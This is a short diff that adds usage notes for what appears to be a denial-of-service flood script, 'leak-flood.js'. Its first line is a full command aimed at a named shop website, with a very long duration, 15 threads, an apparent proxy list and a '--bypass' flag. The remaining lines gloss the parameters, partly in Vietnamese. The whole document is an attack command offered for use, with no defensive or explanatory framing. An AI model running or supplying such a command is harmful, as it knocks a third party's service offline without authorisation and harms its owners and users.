@@ -1,0 +1,6 @@
+node leak-flood.js https://bavarian-outfitters.de/ 99999 15 2 500.txt --debug --reset --bypass
+
+99999 Duration
+15 thread
+2 số request mỗi giây
+
